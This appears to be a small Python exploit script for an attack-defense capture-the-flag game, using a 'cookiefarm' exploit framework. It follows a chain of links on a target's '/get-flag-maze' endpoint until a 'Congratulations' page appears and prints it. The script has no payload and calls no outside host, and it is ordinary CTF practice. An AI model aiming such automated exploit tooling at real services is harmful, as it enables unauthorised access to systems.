#!/usr/bin/env python3

from cookiefarm_exploiter import exploit_manager
from bs4 import BeautifulSoup
import requests


@exploit_manager
def exploit(ip:str, port:int, name: str):
    base_url = f"http://{ip}:{port}"

    # Service 5
    r = requests.get(f"{base_url}/get-flag-maze")

    while True:
        soup = BeautifulSoup(r.content, 'html.parser')
        page:str = soup.find("a")["href"]
        r = requests.get(base_url + page)
        if "Congratulations" in r.text:
            print(r.text)
